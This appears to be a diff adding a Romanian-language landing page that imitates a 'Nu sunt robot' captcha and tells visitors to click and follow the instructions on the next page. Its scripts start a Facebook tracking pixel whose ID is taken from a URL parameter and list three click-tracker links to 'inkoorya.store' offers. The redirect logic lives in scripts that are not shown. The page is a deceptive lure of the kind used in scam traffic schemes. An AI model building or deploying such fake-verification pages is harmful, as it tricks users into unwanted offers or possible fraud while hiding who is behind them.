@@ -1,0 +1,87 @@
+<!DOCTYPE html><html lang="ro" style="--vh: 672px;"><head>
+  <base href="">
+
+  <title></title>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <meta name="theme-color" content="#ecedef">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="format-detection" content="address=no">
+
+  <link media="all" rel="stylesheet" href="style.min.css">
+
+  <script src="getUrlParams.js"></script>
+  <script>
+    if (getAllUrlParams().sub5 !== undefined) {
+      sub5 = getAllUrlParams().sub5;
+
+      !function (f, b, e, v, n, t, s) {
+        if (f.fbq) return; n = f.fbq = function () {
+          n.callMethod ?
+            n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+        };
+        if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+        n.queue = []; t = b.createElement(e); t.async = !0;
+        t.src = v; s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s)
+      }(window, document, 'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+
+      fbq('init', sub5);
+      console.log(sub5)
+    }
+  </script>
+
+  <script>
+    let lp1 = 'https://inkoorya.store/click?lp=1&to_offer=2'
+    let lp2 = 'https://inkoorya.store/click?lp=1&to_offer=1 '
+    let lp3 = 'https://inkoorya.store/click?lp=1&to_offer=3'
+  </script>
+</head>
+
+<body>
+  <div class="wrap" id="wrap">
+    <div class="wrap-inner">
+      <h1 class="title" id="title">Confirmă că nu<br> ești robot</h1>
+      <p class="description" id="description">Apasă butonul și urmează<br> instrucțiunile din pagina<br> următoare</p>
+
+      <div class="captcha-wrap" id="captcha">
+        <input type="checkbox" id="check" style="display: none;">
+        <label for="check" class="check-wrap"></label>
+        <span class="checkbox-text" id="checkboxText">Nu sunt robot</span>
+        <img class="icon" src="captcha.png">
+      </div>
+    </div>
+  </div>
+
+  <div class="lang" id="lang">
+    <span class="lang__title" id="lang-title">RO</span>
+    <div class="lang__wrap lang__wrap--hide" id="lang-wrap">
+      <button class="lang__btn" data-lang-btn="">EN</button>
+      <button class="lang__btn" data-lang-btn="">RU</button>
+      <button class="lang__btn" data-lang-btn="">BG</button>
+      <button class="lang__btn" data-lang-btn="">HR</button>
+      <button class="lang__btn" data-lang-btn="">LT</button>
+      <button class="lang__btn" data-lang-btn="">LV</button>
+      <button class="lang__btn" data-lang-btn="">RS</button>
+      <button class="lang__btn" data-lang-btn="">EE</button>
+      <button class="lang__btn" data-lang-btn="">RO</button>
+      <button class="lang__btn" data-lang-btn="">FR</button>
+      <button class="lang__btn" data-lang-btn="">PL</button>
+      <button class="lang__btn" data-lang-btn="">PS</button>
+      <button class="lang__btn" data-lang-btn="">CZ</button>
+      <button class="lang__btn" data-lang-btn="">SE</button>
+    </div>
+  </div>
+
+
+  <script src="jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="ajax-support.min.js"></script>
+  <script src="ajax.min.js"></script>
+
+
+
+</body></html>
